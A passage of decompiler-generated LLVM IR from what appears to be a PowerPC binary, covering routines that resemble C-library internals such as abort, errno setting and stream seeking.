  %v1_100122f0 = add i32 %v0_100122e4, 136
  %v2_100122f0 = inttoptr i32 %v1_100122f0 to i32*
  %v3_100122f0 = load i32, i32* %v2_100122f0, align 4
  store i32 %v3_100122f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100122f8

dec_label_pc_100122f8:                            ; preds = %dec_label_pc_100122a8, %dec_label_pc_100122d8
  store i32 268509976, i32* @lr, align 4
  %v0_10012314 = call i32 @function_1001250c()
  %v0_10012318 = load i32, i32* %r30.global-to-local, align 4
  %v3_10012318 = icmp eq i32 %v0_10012318, 0
  store i32 %v0_10012314, i32* @r31, align 4
  br i1 %v3_10012318, label %dec_label_pc_10012354, label %dec_label_pc_10012328

dec_label_pc_10012328:                            ; preds = %dec_label_pc_100122f8
  %v1_10012320 = icmp slt i32 %v0_10012314, 0
  %v1_10012328 = add i32 %v0_10012318, 4
  store i32 %v1_10012328, i32* @r3, align 4
  %v2_1001232c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1001232c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_10012320, label %dec_label_pc_10012354, label %dec_label_pc_10012338

dec_label_pc_10012338:                            ; preds = %dec_label_pc_10012328
  %v3_10012338 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_10012338, i32* %r0.global-to-local, align 4
  %v2_1001233c = inttoptr i32 %v0_10012318 to i32*
  store i32 %v3_10012338, i32* %v2_1001233c, align 4
  store i32 268510020, i32* @lr, align 4
  %v0_10012340 = call i32 @function_1000dcb0()
  %v1_1001234c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001234c = add i32 %v1_1001234c, 136
  %v3_1001234c = inttoptr i32 %v2_1001234c to i32*
  %v0_10012350 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012350 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012350 = add i32 %v1_10012350, 132
  %v3_10012350 = inttoptr i32 %v2_10012350 to i32*
  store i32 %v0_10012350, i32* %v3_10012350, align 4
  %v0_10012358.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012354

dec_label_pc_10012354:                            ; preds = %dec_label_pc_10012328, %dec_label_pc_100122f8, %dec_label_pc_10012338
  %v0_10012358 = phi i32 [ %v0_10012314, %dec_label_pc_10012328 ], [ %v0_10012314, %dec_label_pc_100122f8 ], [ %v0_10012358.pre, %dec_label_pc_10012338 ]
  store i32 %v0_100122ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_10012358

; uselistorder directives
  uselistorder i32 %v0_10012314, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10012354, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100122f8, { 1, 0 }
}

define i32 @function_1001236c(i32 %arg1) local_unnamed_addr {
dec_label_pc_100123a0.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v2_10012380 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10012380, i32* %r29.global-to-local, align 4
  %v0_10012388 = call i32 @function_10010040()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_100123a433 = add i32 %v2_10012380, 124
  %v4_100123a434 = inttoptr i32 %v3_100123a433 to i32*
  store i32 0, i32* %v4_100123a434, align 4
  %v0_100123a835 = load i32, i32* %r9.global-to-local, align 4
  %v1_100123a836 = add i32 %v0_100123a835, -1
  store i32 %v1_100123a836, i32* %r9.global-to-local, align 4
  %v0_100123ac37 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100123ac38 = add i32 %v0_100123ac37, -1
  store i32 %v1_100123ac38, i32* %ctr.global-to-local, align 4
  %v2_100123ac39 = icmp eq i32 %v1_100123ac38, 0
  br i1 %v2_100123ac39, label %dec_label_pc_100123b0, label %dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge

dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge: ; preds = %dec_label_pc_100123a0.lr.ph, %dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge
  %v1_100123a840 = phi i32 [ %v1_100123a8, %dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge ], [ %v1_100123a836, %dec_label_pc_100123a0.lr.ph ]
  %v0_100123a4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100123a0 = mul i32 %v1_100123a840, 4
  %v1_100123a4 = load i32, i32* %r29.global-to-local, align 4
  %v3_100123a4 = add i32 %v1_100123a4, %v1_100123a0
  %v4_100123a4 = inttoptr i32 %v3_100123a4 to i32*
  store i32 %v0_100123a4.pre, i32* %v4_100123a4, align 4
  %v0_100123a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100123a8 = add i32 %v0_100123a8, -1
  store i32 %v1_100123a8, i32* %r9.global-to-local, align 4
  %v0_100123ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_100123ac = add i32 %v0_100123ac, -1
  store i32 %v1_100123ac, i32* %ctr.global-to-local, align 4
  %v2_100123ac = icmp eq i32 %v1_100123ac, 0
  br i1 %v2_100123ac, label %dec_label_pc_100123b0, label %dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge

dec_label_pc_100123b0:                            ; preds = %dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge, %dec_label_pc_100123a0.lr.ph
  store i32 %v2_10012380, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_100123b8 = call i32 @function_1000ef10()
  %v3_100123bc = icmp eq i32 %v0_100123b8, 0
  br i1 %v3_100123bc, label %dec_label_pc_100123c4, label %dec_label_pc_100123d4

dec_label_pc_100123c4:                            ; preds = %dec_label_pc_100123b0
  store i32 268510164, i32* @lr, align 4
  %v3_100123d0 = call i32 @function_1000c714(i32 1, i32 %v2_10012380, i32 0)
  br label %dec_label_pc_100123d4

dec_label_pc_100123d4:                            ; preds = %dec_label_pc_100123b0, %dec_label_pc_100123c4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_100123d8 = load i32, i32* @global_var_1002b96c.826, align 4
  %v3_100123dc = icmp eq i32 %v3_100123d8, 0
  br i1 %v3_100123dc, label %dec_label_pc_100123e4, label %dec_label_pc_1001240c

dec_label_pc_100123e4:                            ; preds = %dec_label_pc_100123d4
  store i32 1, i32* @global_var_1002b96c.826, align 4
  br label %dec_label_pc_100123ec

dec_label_pc_100123ec:                            ; preds = %dec_label_pc_10012468, %dec_label_pc_100123e4
  store i32 ptrtoint (i32* @global_var_1002b888.824 to i32), i32* %r29.global-to-local, align 4
  %v0_100123f8 = call i32 @function_10010040()
  store i32 268510212, i32* @lr, align 4
  %v1_10012400 = call i32 @function_10014058(i32 6)
  %v0_10012408 = call i32 @function_10010040()
  %v3_10012410.pre = load i32, i32* @global_var_1002b96c.826, align 4
  br label %dec_label_pc_1001240c

dec_label_pc_1001240c:                            ; preds = %dec_label_pc_100123d4, %dec_label_pc_100123ec
  %v0_10012484 = phi i32 [ %v3_100123d8, %dec_label_pc_100123d4 ], [ %v3_10012410.pre, %dec_label_pc_100123ec ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012414 = icmp eq i32 %v0_10012484, 1
  br i1 %v3_10012414, label %dec_label_pc_10012454.lr.ph, label %dec_label_pc_10012484

dec_label_pc_10012454.lr.ph:                      ; preds = %dec_label_pc_1001240c
  %v2_10012420 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002b96c.826, align 4
  store i32 ptrtoint (i32* @global_var_10012434.828 to i32), i32* @lr, align 4
  %v3_10012430 = call i32 @function_1000dd4c(i32 %v2_10012420, i32 0, i32 140)
  store i32 %v2_10012380, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001245823 = add i32 %v2_10012380, 124
  store i32 %v2_1001245823, i32* %r9.global-to-local, align 4
  %v2_1001245c24 = add i32 %v2_10012380, 256
  %v3_1001245c25 = inttoptr i32 %v2_1001245c24 to i32*
  store i32 -1, i32* %v3_1001245c25, align 4
  %v0_1001246026 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001246027 = add i32 %v0_1001246026, -1
  store i32 %v1_1001246027, i32* %r11.global-to-local, align 4
  %v0_1001246428 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001246429 = add i32 %v0_1001246428, -1
  store i32 %v1_1001246429, i32* %ctr.global-to-local, align 4
  %v2_1001246430 = icmp eq i32 %v1_1001246429, 0
  br i1 %v2_1001246430, label %dec_label_pc_10012468, label %dec_label_pc_10012454.dec_label_pc_10012454_crit_edge

dec_label_pc_10012454.dec_label_pc_10012454_crit_edge: ; preds = %dec_label_pc_10012454.lr.ph, %dec_label_pc_10012454.dec_label_pc_10012454_crit_edge
  %v1_1001246031 = phi i32 [ %v1_10012460, %dec_label_pc_10012454.dec_label_pc_10012454_crit_edge ], [ %v1_1001246027, %dec_label_pc_10012454.lr.ph ]
  %v1_10012458.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1001245c.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10012454 = mul i32 %v1_1001246031, 4
  %v2_10012458 = add i32 %v1_10012454, %v1_10012458.pre
  store i32 %v2_10012458, i32* %r9.global-to-local, align 4
  %v2_1001245c = add i32 %v2_10012458, 132
  %v3_1001245c = inttoptr i32 %v2_1001245c to i32*
  store i32 %v0_1001245c.pre, i32* %v3_1001245c, align 4
  %v0_10012460 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012460 = add i32 %v0_10012460, -1
  store i32 %v1_10012460, i32* %r11.global-to-local, align 4
  %v0_10012464 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012464 = add i32 %v0_10012464, -1
  store i32 %v1_10012464, i32* %ctr.global-to-local, align 4
  %v2_10012464 = icmp eq i32 %v1_10012464, 0
  br i1 %v2_10012464, label %dec_label_pc_10012468, label %dec_label_pc_10012454.dec_label_pc_10012454_crit_edge

dec_label_pc_10012468:                            ; preds = %dec_label_pc_10012454.dec_label_pc_10012454_crit_edge, %dec_label_pc_10012454.lr.ph
  store i32 268510336, i32* @lr, align 4
  %v4_1001247c = call i32 @function_100122a8(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_100123ec

dec_label_pc_10012484:                            ; preds = %dec_label_pc_1001240c
  %v3_10012484 = icmp eq i32 %v0_10012484, 2
  br i1 %v3_10012484, label %dec_label_pc_1001248c, label %dec_label_pc_10012498

dec_label_pc_1001248c:                            ; preds = %dec_label_pc_10012484
  store i32 3, i32* @global_var_1002b96c.826, align 4
  br label %dec_label_pc_10012498

dec_label_pc_10012498:                            ; preds = %dec_label_pc_10012484, %dec_label_pc_1001248c
  %v3_10012498 = phi i32 [ %v0_10012484, %dec_label_pc_10012484 ], [ 3, %dec_label_pc_1001248c ]
  %v1_100124a0 = icmp ne i32 %v3_10012498, 3
  call void @__pseudo_cond_branch(i1 %v1_100124a0, i32 268510388)
  store i32 4, i32* @global_var_1002b96c.826, align 4
  %v1_100124b0 = call i32 @function_1000c228(i32 127)
  ret i32 %v1_100124b0

; uselistorder directives
  uselistorder i32 %v1_10012464, { 1, 0 }
  uselistorder i32 %v1_10012460, { 1, 0 }
  uselistorder i32 %v1_100123ac, { 1, 0 }
  uselistorder i32 %v1_100123a8, { 1, 0 }
  uselistorder i32 %v2_10012380, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 4, 5, 9, 8, 1, 2, 3 }
  uselistorder i32 (i32)* @function_1000c228, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 12, 11, 2 }
  uselistorder i32 127, { 1, 6, 0, 2, 4, 7, 5, 3 }
  uselistorder i32 (i32, i32*, i32)* @function_100122a8, { 2, 0, 1 }
  uselistorder i32 132, { 4, 2, 3, 0, 1 }
  uselistorder i32* @global_var_1002b96c.826, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000c714, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_1000ef10, { 0, 4, 3, 2, 1 }
  uselistorder i32 124, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10012498, { 1, 0 }
  uselistorder label %dec_label_pc_10012454.dec_label_pc_10012454_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001240c, { 1, 0 }
  uselistorder label %dec_label_pc_100123d4, { 1, 0 }
  uselistorder label %dec_label_pc_100123a0.dec_label_pc_100123a0_crit_edge, { 1, 0 }
}

define i32 @function_100124bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_100124bc:
  %v1_100124bc = add i32 %arg1, 28
  %v2_100124bc = inttoptr i32 %v1_100124bc to i32*
  %v3_100124bc = load i32, i32* %v2_100124bc, align 4
  store i32 %v3_100124bc, i32* @global_var_1002b970.829, align 4
  %v1_100124cc = add i32 %arg1, 44
  %v2_100124cc = inttoptr i32 %v1_100124cc to i32*
  %v3_100124cc = load i32, i32* %v2_100124cc, align 4
  store i32 %v3_100124cc, i32* @global_var_1002b974.830, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_100124d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100124d8:
  store i32 %arg1, i32* @global_var_1002b978.793, align 4
  %v0_10012500 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10012500)
  store i32 12, i32* @r3, align 4
  %v0_10012508 = call i32 @function_10010398()
  ret i32 %v0_10012508

; uselistorder directives
  uselistorder i32* @global_var_1002b978.793, { 1, 0, 2 }
}

define i32 @function_1001250c() local_unnamed_addr {
dec_label_pc_1001250c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10012524 = call i32 @__asm_mfcr()
  %v1_10012528 = and i32 %v0_10012524, 268435456
  %v3_10012528 = icmp eq i32 %v1_10012528, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10012524, i32* %r31.global-to-local, align 4
  br i1 %v3_10012528, label %dec_label_pc_10012540, label %dec_label_pc_10012534

dec_label_pc_10012534:                            ; preds = %dec_label_pc_1001250c
  %v0_10012534 = call i32 @function_1000c85c()
  %v0_10012538 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012538 = inttoptr i32 %v0_10012534 to i32*
  store i32 %v0_10012538, i32* %v2_10012538, align 4
  br label %dec_label_pc_10012540

dec_label_pc_10012540:                            ; preds = %dec_label_pc_1001250c, %dec_label_pc_10012534
  %v0_10012550 = phi i32 [ %v0_10012524, %dec_label_pc_1001250c ], [ -1, %dec_label_pc_10012534 ]
  ret i32 %v0_10012550

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_10012540, { 1, 0 }
}

define i32 @function_10012554(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10012554:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001256c = call i32 @__asm_mfcr()
  %v1_10012570 = and i32 %v0_1001256c, 268435456
  %v3_10012570 = icmp eq i32 %v1_10012570, 0
  store i32 %v0_1001256c, i32* %r31.global-to-local, align 4
  br i1 %v3_10012570, label %dec_label_pc_10012588, label %dec_label_pc_1001257c

dec_label_pc_1001257c:                            ; preds = %dec_label_pc_10012554
  %v0_1001257c = call i32 @function_1000c85c()
  %v0_10012580 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012580 = inttoptr i32 %v0_1001257c to i32*
  store i32 %v0_10012580, i32* %v2_10012580, align 4
  br label %dec_label_pc_10012588

dec_label_pc_10012588:                            ; preds = %dec_label_pc_10012554, %dec_label_pc_1001257c
  %v0_10012598 = phi i32 [ %v0_1001256c, %dec_label_pc_10012554 ], [ -1, %dec_label_pc_1001257c ]
  ret i32 %v0_10012598

; uselistorder directives
  uselistorder label %dec_label_pc_10012588, { 1, 0 }
}

define i32 @function_1001259c(i16* %arg1) local_unnamed_addr {
dec_label_pc_1001259c:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100125b0 = add i32 %tmp, 52
  %v3_100125b0 = inttoptr i32 %v2_100125b0 to i32*
  %v4_100125b0 = load i32, i32* %v3_100125b0, align 4
  store i32 %v4_100125b0, i32* @r28, align 4
  %v3_100125b4 = icmp eq i32 %v4_100125b0, 0
  store i1 %v3_100125b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100125b4, label %dec_label_pc_100125bc, label %dec_label_pc_100125dc

dec_label_pc_100125bc:                            ; preds = %dec_label_pc_1001259c
  %v2_100125c4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100125c4, i32* @r3, align 4
  %v0_100125d0 = call i32 @function_10010048()
  %v0_100125d8 = call i32 @function_10010040()
  %v0_100125dc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100125dc

dec_label_pc_100125dc:                            ; preds = %dec_label_pc_1001259c, %dec_label_pc_100125bc
  %v0_100125ec = phi i32 [ %tmp, %dec_label_pc_1001259c ], [ %v0_100125dc.pre, %dec_label_pc_100125bc ]
  %v1_100125dc = inttoptr i32 %v0_100125ec to i16*
  %v2_100125dc = load i16, i16* %v1_100125dc, align 2
  %v3_100125dc = zext i16 %v2_100125dc to i32
  store i32 0, i32* @r27, align 4
  %v1_100125e4 = and i32 %v3_100125dc, 64
  %v3_100125e4 = icmp eq i32 %v1_100125e4, 0
  br i1 %v3_100125e4, label %dec_label_pc_100125f8, label %dec_label_pc_100125ec

dec_label_pc_100125ec:                            ; preds = %dec_label_pc_100125dc
  store i32 268510708, i32* @lr, align 4
  %v4_100125f0 = call i32 @function_10012de8(i16* %v1_100125dc, i32 %v1_100125e4)
  store i32 %v4_100125f0, i32* @r27, align 4
  %v0_100125f8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100125f8

dec_label_pc_100125f8:                            ; preds = %dec_label_pc_100125dc, %dec_label_pc_100125ec
  %v0_100125f8 = phi i32 [ %v0_100125ec, %dec_label_pc_100125dc ], [ %v0_100125f8.pre, %dec_label_pc_100125ec ]
  %v1_100125f8 = add i32 %v0_100125f8, 4
  %v2_100125f8 = inttoptr i32 %v1_100125f8 to i32*
  %v3_100125f8 = load i32, i32* %v2_100125f8, align 4
  store i32 268510720, i32* @lr, align 4
  %v1_100125fc = call i32 @function_1000c2f4(i32 %v3_100125f8)
  %v3_10012600 = icmp eq i32 %v1_100125fc, 0
  store i1 %v3_10012600, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_100125fc, -1
  br i1 %tmp8, label %dec_label_pc_1001260c, label %dec_label_pc_10012608

dec_label_pc_10012608:                            ; preds = %dec_label_pc_100125f8
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1001260c

dec_label_pc_1001260c:                            ; preds = %dec_label_pc_100125f8, %dec_label_pc_10012608
  %v1_10012614 = load i32, i32* @r31, align 4
  %v2_10012614 = add i32 %v1_10012614, 4
  %v3_10012614 = inttoptr i32 %v2_10012614 to i32*
  store i32 -1, i32* %v3_10012614, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010040.750 to i32), i32* @r26, align 4
  %v2_10012620 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012620, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1002b58c.711 to i32), i32* @r29, align 4
  store i32 %v2_10012620, i32* @r3, align 4
  %v0_10012634 = call i32 @function_10010048()
  %v0_1001263c = call i32 @function_10010040()
  %v3_10012644 = load i32, i32* @global_var_1002b930.831, align 4
  store i32 %v2_10012620, i32* @r3, align 4
  %v1_10012650 = add i32 %v3_10012644, 1
  store i32 %v1_10012650, i32* @global_var_1002b930.831, align 4
  %v0_10012658 = call i32 @function_10010048()
  %v0_1001265c = load i32, i32* @r31, align 4
  %v1_1001265c = inttoptr i32 %v0_1001265c to i16*
  %v2_1001265c = load i16, i16* %v1_1001265c, align 2
  %v3_1001265c = zext i16 %v2_1001265c to i32
  %v0_10012660 = load i32, i32* @r28, align 4
  %v3_10012660 = icmp eq i32 %v0_10012660, 0
  store i1 %v3_10012660, i1* %cr7_eq.global-to-local, align 1
  %v1_10012664 = call i32 @__asm_rlwinm(i32 %v3_1001265c, i32 0, i32 17, i32 18)
  %v1_1001266c = or i32 %v1_10012664, 48
  %v1_10012670 = trunc i32 %v1_1001266c to i16
  %v2_10012670 = load i32, i32* @r31, align 4
  %v3_10012670 = inttoptr i32 %v2_10012670 to i16*
  store i16 %v1_10012670, i16* %v3_10012670, align 2
  %v0_10012674 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10012674, label %dec_label_pc_10012678, label %dec_label_pc_10012684

dec_label_pc_10012678:                            ; preds = %dec_label_pc_1001260c
  %v2_10012678 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012678, i32* @r3, align 4
  %v0_10012680 = call i32 @function_10010048()
  br label %dec_label_pc_10012684

dec_label_pc_10012684:                            ; preds = %dec_label_pc_1001260c, %dec_label_pc_10012678
  %v0_10012684 = load i32, i32* @r31, align 4
  %v1_10012684 = inttoptr i32 %v0_10012684 to i16*
  %v2_10012684 = load i16, i16* %v1_10012684, align 2
  %v1_10012688 = and i16 %v2_10012684, 16384
  %v3_10012688 = icmp eq i16 %v1_10012688, 0
  br i1 %v3_10012688, label %dec_label_pc_10012698, label %dec_label_pc_10012690

dec_label_pc_10012690:                            ; preds = %dec_label_pc_10012684
  %v1_10012690 = add i32 %v0_10012684, 8
  %v2_10012690 = inttoptr i32 %v1_10012690 to i32*
  %v3_10012690 = load i32, i32* %v2_10012690, align 4
  store i32 268510872, i32* @lr, align 4
  %v1_10012694 = call i32 @function_1000f0b8(i32 %v3_10012690)
  br label %dec_label_pc_10012698

dec_label_pc_10012698:                            ; preds = %dec_label_pc_10012684, %dec_label_pc_10012690
  store i32 %v2_10012620, i32* @r3, align 4
  %v0_100126a4 = call i32 @function_10010048()
  %v0_100126ac = call i32 @function_10010040()
  %v3_100126b4 = load i16*, i16** @global_var_1002b934.832, align 4
  %v4_100126b4 = ptrtoint i16* %v3_100126b4 to i32
  store i32 %v2_10012620, i32* @r3, align 4
  %v1_100126c0 = add i32 %v4_100126b4, 1
  %v4_100126c4 = inttoptr i32 %v1_100126c0 to i16*
  store i16* %v4_100126c4, i16** @global_var_1002b934.832, align 4
  %v0_100126c8 = call i32 @function_10010048()
  store i32 268510928, i32* @lr, align 4
  %v0_100126cc = call i32 @function_10012cc8()
  %v0_100126d4 = load i32, i32* @r27, align 4
  ret i32 %v0_100126d4

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 17, { 16, 0, 1, 13, 2, 9, 10, 3, 11, 4, 5, 6, 7, 8, 17, 18, 14, 15, 12 }
  uselistorder i32 (i32)* @function_1000c2f4, { 3, 2, 1, 0, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 11, 10, 9, 8, 7, 6, 5, 4, 12 }
  uselistorder label %dec_label_pc_10012698, { 1, 0 }
  uselistorder label %dec_label_pc_10012684, { 1, 0 }
  uselistorder label %dec_label_pc_1001260c, { 1, 0 }
  uselistorder label %dec_label_pc_100125f8, { 1, 0 }
  uselistorder label %dec_label_pc_100125dc, { 1, 0 }
}

define i32 @function_100126e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100126e8:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_100126f0 = call i32 @function_1001291c(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_100126f0
}

define i32 @function_100126f4(i16* %arg1) local_unnamed_addr {
dec_label_pc_100126f4:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_100126f4 = load i32, i32* @r5, align 4
  store i32 %v0_100126f4, i32* @r7, align 4
  %v0_100126f8 = load i32, i32* @r4, align 4
  %tmp10 = icmp slt i32 %v0_100126f8, 0
  %v1_100126fc = zext i1 %tmp10 to i32
  %v2_100126fc = ashr i32 %v0_100126f8, 31
  %v3_100126fc = and i32 %v2_100126fc, -2
  %v4_100126fc = or i32 %v3_100126fc, %v1_100126fc
  %v0_10012708 = load i32, i32* @lr, align 4
  store i32 %v0_10012708, i32* %r0.global-to-local, align 4
  store i32 %v0_100126f4, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v4_100126fc, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_100126f4, 3
  br i1 %tmp9, label %dec_label_pc_10012740, label %dec_label_pc_1001272c

dec_label_pc_1001272c:                            ; preds = %dec_label_pc_100126f4
  %v0_1001272c = call i32 @function_1000c85c()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10012738 = inttoptr i32 %v0_1001272c to i32*
  store i32 22, i32* %v2_10012738, align 4
  br label %dec_label_pc_10012808

dec_label_pc_10012740:                            ; preds = %dec_label_pc_100126f4
  %v2_10012740 = add i32 %tmp, 52
  %v3_10012740 = inttoptr i32 %v2_10012740 to i32*
  %v4_10012740 = load i32, i32* %v3_10012740, align 4
  store i32 %v4_10012740, i32* @r28, align 4
  %v3_10012744 = icmp eq i32 %v4_10012740, 0
  br i1 %v3_10012744, label %dec_label_pc_1001274c, label %dec_label_pc_1001276c

dec_label_pc_1001274c:                            ; preds = %dec_label_pc_10012740
  %v2_1001274c = add i32 %tmp, 56
  store i32 %v2_1001274c, i32* @r29, align 4
  %v2_10012754 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10012754, i32* @r3, align 4
  %v0_10012760 = call i32 @function_10010048()
  %v0_10012768 = call i32 @function_10010040()
  %v0_1001276c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001276c

dec_label_pc_1001276c:                            ; preds = %dec_label_pc_10012740, %dec_label_pc_1001274c
  %v0_10012778 = phi i32 [ %tmp, %dec_label_pc_10012740 ], [ %v0_1001276c.pre, %dec_label_pc_1001274c ]
  %v1_1001276c = inttoptr i32 %v0_10012778 to i16*
  %v2_1001276c = load i16, i16* %v1_1001276c, align 2
  %v3_1001276c = zext i16 %v2_1001276c to i32
  store i32 %v3_1001276c, i32* %r0.global-to-local, align 4
  %v1_10012770 = and i32 %v3_1001276c, 64
  store i32 %v1_10012770, i32* %r9.global-to-local, align 4
  %v3_10012770 = icmp eq i32 %v1_10012770, 0
  br i1 %v3_10012770, label %dec_label_pc_10012788, label %dec_label_pc_10012778

dec_label_pc_10012778:                            ; preds = %dec_label_pc_1001276c
  store i32 %v0_10012778, i32* @r3, align 4
  store i32 268511104, i32* @lr, align 4
  %v0_1001277c = call i32 @function_1000cb04()
  %v3_10012780 = icmp eq i32 %v0_1001277c, 0
  br i1 %v3_10012780, label %dec_label_pc_10012788, label %dec_label_pc_100127f0

dec_label_pc_10012788:                            ; preds = %dec_label_pc_10012778, %dec_label_pc_1001276c
  %v0_10012788 = load i32, i32* @r30, align 4
  %v3_10012788 = icmp eq i32 %v0_10012788, 1
  br i1 %v3_10012788, label %dec_label_pc_10012790, label %dec_label_pc_10012788.dec_label_pc_100127a4_crit_edge

dec_label_pc_10012788.dec_label_pc_100127a4_crit_edge: ; preds = %dec_label_pc_10012788
  br label %dec_label_pc_100127a4

dec_label_pc_10012790:                            ; preds = %dec_label_pc_10012788
  %v0_10012790 = load i32, i32* @r31, align 4
  %v1_10012790 = inttoptr i32 %v0_10012790 to i16*
  %v2_10012794 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268511132, i32* @lr, align 4
  %v4_10012798 = call i32 @function_10012820(i16* %v1_10012790, i32 %v2_10012794)
  %v1_1001279c = icmp slt i32 %v4_10012798, 0
  br i1 %v1_1001279c, label %dec_label_pc_100127f0, label %dec_label_pc_10012790.dec_label_pc_100127a4_crit_edge

dec_label_pc_10012790.dec_label_pc_100127a4_crit_edge: ; preds = %dec_label_pc_10012790
  %v0_100127a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100127a4

dec_label_pc_100127a4:                            ; preds = %dec_label_pc_10012788.dec_label_pc_100127a4_crit_edge, %dec_label_pc_10012790.dec_label_pc_100127a4_crit_edge
  %v0_100127a4 = phi i32 [ %v0_10012788, %dec_label_pc_10012788.dec_label_pc_100127a4_crit_edge ], [ %v0_100127a4.pre, %dec_label_pc_10012790.dec_label_pc_100127a4_crit_edge ]
  %v0_100127a8 = load i32, i32* @r31, align 4
  store i32 268511156, i32* @lr, align 4
